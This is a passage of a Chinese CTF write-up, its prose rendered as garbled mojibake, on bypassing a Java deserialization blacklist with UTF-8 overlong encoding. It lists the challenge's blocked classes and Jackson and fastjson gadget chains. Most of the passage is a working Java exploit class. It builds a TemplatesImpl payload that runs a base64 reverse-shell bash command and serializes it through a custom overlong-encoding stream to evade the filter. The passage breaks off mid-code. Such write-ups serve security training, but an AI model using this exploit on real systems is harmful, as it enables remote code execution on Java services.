class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> &#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);<br>        &#125;)<br>        .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;Error:&#x27;</span>, error));<br>&#125;;<br></code></pre></td></tr></table></figure><p>æ„æ€å°±æ˜¯è·³è½¬&#x2F;sourceè¯»æºç å‡ºæ¥ã€‚</p><p>ä½†æ˜¯æœ‰ä¸ªjwtéªŒè¯ï¼Œå…¶å®å¯†é’¥å°±æ˜¯jsrcï¼Œç„¶åå¸¦cookieè®¿é—®&#x2F;sourceå¾—åˆ°é™„ä»¶ï¼Œç›´æ¥downä¸‹æ¥åˆ†æã€‚</p><p>blacklistï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java">String[] s = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;java.util.HashMap&quot;</span>,<br> <span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>, <br> <span class="hljs-string">&quot;com.alibaba.fastjson.JSONArrayLlist&quot;</span>&#125;;<br> <br> ----------------------------------------------------------------------------------------------------<br> <br>        blackList.add(<span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>);<br>        blackList.add(<span class="hljs-string">&quot;com.sun.syndication.feed.impl.ToStringBean&quot;</span>);<br>        blackList.add(<span class="hljs-string">&quot;java.security.SignedObject&quot;</span>);<br>        blackList.add(<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>);<br></code></pre></td></tr></table></figure><p>romeé“¾å­çš„ä¸€äº›è¢«banäº†ï¼Œå¯ä»¥çœ‹åˆ°äºŒæ¬¡ååºåˆ—åŒ–ç”¨çš„SignedObjectä¹Ÿè¢«banäº†ã€‚</p><p>ä¾èµ–å¦‚ä¸‹ï¼Œæœ‰fjï¼Œromeï¼Œspringï¼š</p><p><img src="/2024/08/22/Overlong-Encoding-utf-8-Bypass/image-20240822162719499.png" alt="image-20240822162719499"></p><p>ä½†è¿™é“é¢˜åªè¦ä½¿ç”¨<code>UTF-8 Overlong Encoding</code>å°±å¯ä»¥ç»•è¿‡è¿™ä¸ªblacklistã€‚</p><p>sinkç‚¹å¾ˆå¥½æ‰¾ï¼š</p><p><img src="/2024/08/22/Overlong-Encoding-utf-8-Bypass/image-20240822163252420.png" alt="image-20240822163252420"></p><p>ä»£ç é€»è¾‘å¯è§ä¸¤å±‚wafï¼Œç¬¬ä¸€ä¸ªæ˜¯ä»–è‡ªå®šä¹‰çš„MyObjectInputStreamï¼Œè¿˜æœ‰ä¸€ä¸ªCompared()å‡½æ•°çš„æ£€æµ‹ã€‚</p><p>MyObjectInputStreamçš„blacklistä¸Šé¢å°±è®²äº†ã€‚</p><p><img src="/2024/08/22/Overlong-Encoding-utf-8-Bypass/image-20240822163401930.png" alt="image-20240822163401930"></p><p>Compared()å‡½æ•°çš„blacklistï¼š</p><p><img src="/2024/08/22/Overlong-Encoding-utf-8-Bypass/image-20240822163418863.png" alt="image-20240822163418863"></p><p>ä¹Ÿå°±æ˜¯è¯´ä¸€ä¸ªæ˜¯æ˜æ–‡æµé‡å±‚é¢çš„æ£€æµ‹ï¼Œä¸€ä¸ªæ˜¯ååºåˆ—åŒ–è¿‡ç¨‹çš„æ£€æµ‹ï¼Œå‰è€…å¯ä»¥è‡ªå®šä¹‰è¾“å‡ºæµæ”¹å†™åºåˆ—åŒ–æ•°æ®ç»•è¿‡ï¼Œä¹Ÿå°±æ˜¯UTF8é‚£ç©æ„ã€‚<a href="https://vidar-team.feishu.cn/docx/LJN4dzu1QoEHt4x3SQncYagpnGd">Docs (feishu.cn)</a></p><p>å› ä¸ºä¾èµ–æœ‰springçš„ç¼˜æ•…ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥æƒ³åˆ°Jacksonçš„ä¸€ä¸ªåŸç”Ÿååºåˆ—åŒ–é“¾ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">EventListenerList.readObject -&gt; <br>POJONode.toString -&gt; <br>TemplatesImpl.getOutputProperties<br></code></pre></td></tr></table></figure><p><a href="https://xz.aliyun.com/t/14190?time__1311=mqmx9QDQdCqqlpzG77Twk4frxA2DGwD&alichlgref=https://www.google.com/">JacksonåŸç”Ÿååºåˆ—åŒ–</a></p><p><a href="https://xz.aliyun.com/t/12846?time__1311=mqmhq+xfrxCWDsD7GY0=YG=FdrIxAx7IIQx&alichlgref=https://www.google.com/#toc-2">å¤„ç†Jacksoné“¾å­ä¸ç¨³å®šæ€§</a></p><p>åˆå› ä¸ºæœ‰fjä¾èµ–ï¼Œæ‰€ä»¥è¿˜èƒ½æ‰“fastjsonçš„åŸç”Ÿååºåˆ—åŒ–ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">HashMap.readObject -&gt;<br>HashMap.putVal -&gt;<br>HotSwappableTargetSource.equals -&gt;<br>XString.equals -&gt;<br>JSONArray.toString -&gt; <br>JSONArray#toJSONString -&gt; <br>TemplatesImpl.getOutputProperties<br></code></pre></td></tr></table></figure><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>Bypassçš„æ–¹æ³•å°±æ˜¯ç›´æ¥ç”¨<code>UTF8 Overlong Encoding</code>é‡å†™ä¸€ä¸ª<code>ObjectOutputStream</code>ï¼Œç”¨Jacksoné“¾ç¨å¾®æ”¹æ”¹å°±æœ‰äº†ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.example.jsrc.func.ByteCompare;<br><span class="hljs-keyword">import</span> com.example.jsrc.func.MyObjectInputStream;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;<br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><span class="hljs-keyword">import</span> org.springframework.aop.framework.AdvisedSupport;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-comment">//æœ€é€šç”¨çš„åŠæ³•</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        ctClass.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, ctClass);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;bash -c &#123;echo,&lt;base64åå¼¹shell&gt;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;);&quot;</span>);<br>        ctClass.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[] bytes = ctClass.toBytecode();<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templatesImpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytes&#125;);<br>        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br>        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> getProxy(templatesImpl, Templates.class);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> getXstringMap(proxy);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">UTF8OverlongObjectOutputStream</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UTF8OverlongObjectOutputStream</span>(byteArrayOutputStream);<br>        o.writeObject(exp);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());<br>        System.out.println(payload);<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getProxy</span><span class="hljs-params">(Object obj,Class&lt;?&gt; clazz)</span> <span class="hljs-keyword">throws</span> Exception<br>    &#123;<br>        <span class="hljs-type">AdvisedSupport</span> <span class="hljs-variable">advisedSupport</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdvisedSupport</span>();<br>        advisedSupport.setTarget(obj);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>).getConstructor(AdvisedSupport.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(advisedSupport);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;clazz&#125;, handler);<br>        <span class="hljs-keyword">return</span> proxy;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getXstringMap</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception<br>    &#123;<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> ClassPool.getDefault().get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>        <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>        ctClass.removeMethod(writeReplace);<br>        ctClass.toClass();<br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(obj);<br><br>        <span class="hljs-type">XString</span> <span class="hljs-variable">xString</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XString</span>(<span class="hljs-string">&quot;test&quot;</span>);<br><br>        HashMap&lt;Object, Object&gt; map1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        HashMap&lt;Object, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map1.put(<span class="hljs-string">&quot;yy&quot;</span>, node);<br>        map1.put(<span class="hljs-string">&quot;zZ&quot;</span>, xString);<br>        map2.put(<span class="hljs-string">&quot;yy&quot;</span>, xString);<br>        map2.put(<span class="hljs-string">&quot;zZ&quot;</span>, node);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> makeMap(map1, map2);<br><br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> HashMap <span class="hljs-title function_">makeMap</span><span class="hljs-params">(Object v1, Object v2)</span> <span class="hljs-keyword">throws</span> Exception<br>    &#123;<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        setFieldValue(s, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">2</span>);<br>        Class nodeC;<br>        <span class="hljs-keyword">try</span> &#123;<br>            nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Entry&quot;</span>);<br>        &#125;<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">nodeCons</span> <span class="hljs-operator">=</span> nodeC.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, nodeC);<br>        nodeCons.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">tbl</span> <span class="hljs-operator">=</span> Array.newInstance(nodeC, <span class="hljs-number">2</span>);<br>        Array.set(tbl, <span class="hljs-number">0</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, v1, v1, <span class="hljs-literal">null</span>));<br>        Array.set(tbl, <span class="hljs-number">1</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, v2, v2, <span class="hljs-literal">null</span>));<br>        setFieldValue(s, <span class="hljs-string">&quot;table&quot;</span>, tbl);<br>        <span class="hljs-keyword">return</span> s;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception<br>    &#123;<br>        Class&lt;?&gt; clazz = obj.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title function_">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field = clazz.getDeclaredField(fieldName);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) &#123;<br>            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-literal">null</span>)<br>                field = getField(clazz.getSuperclass(), fieldName);<br>        &#125;<br>        <span class="hljs-keyword">return</span> field;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> getField(obj.getClass(), fieldName);<br>        <span class="hljs-keyword">return</span> field.get(obj);<br>    &#125;<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UTF8OverlongObjectOutputStream</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ObjectOutputStream</span> &#123;<br>        <span class="hljs-keyword">public</span> HashMap&lt;Character, <span class="hljs-type">int</span>[]&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;Character, <span class="hljs-type">int</span>[]&gt;() &#123;&#123;<br>            put(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc0</span>, <span class="hljs-number">0xae</span>&#125;);<br>            put(<span class="hljs-string">&#x27;;&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc0</span>, <span class="hljs-number">0xbb</span>&#125;);<br>            put(<span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc0</span>, <span class="hljs-number">0xa4</span>&#125;);<br>            put(<span class="hljs-string">&#x27;[&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x9b</span>&#125;);<br>            put(<span class="hljs-string">&#x27;]&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x9d</span>&#125;);<br>            put(<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa1</span>&#125;);<br>            put(<span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa2</span>&#125;);<br>            put(<span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa3</span>&#125;);<br>            put(<span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa4</span>&#125;);<br>            put(<span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa5</span>&#125;);<br>            put(<span class="hljs-string">&#x27;f&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa6</span>&#125;);<br>            put(<span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa7</span>&#125;);<br>            put(<span class="hljs-string">&#x27;h&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa8</span>&#125;);<br>            put(<span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa9</span>&#125;);<br>            put(<span class="hljs-string">&#x27;j&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xaa</span>&#125;);<br>            put(<span class="hljs-string">&#x27;k&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xab</span>&#125;);<br>            put(<span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xac</span>&#125;);<br>            put(<span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xad</span>&#125;);<br>            put(<span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xae</span>&#125;);<br>            put(<span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xaf</span>&#125;); <span class="hljs-comment">// 0x6f</span><br>            put(<span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb0</span>&#125;);<br>            put(<span class="hljs-string">&#x27;q&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb1</span>&#125;);<br>            put(<span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb2</span>&#125;);<br>            put(<span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb3</span>&#125;);<br>            put(<span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb4</span>&#125;);<br>            put(<span class="hljs-string">&#x27;u&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb5</span>&#125;);<br>            put(<span class="hljs-string">&#x27;v&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb6</span>&#125;);<br>            put(<span class="hljs-string">&#x27;w&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb7</span>&#125;);<br>            put(<span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb8</span>&#125;);<br>            put(<span class="hljs-string">&#x27;y&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb9</span>&#125;);<br>            put(<span class="hljs-string">&#x27;z&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xba</span>&#125;);<br>            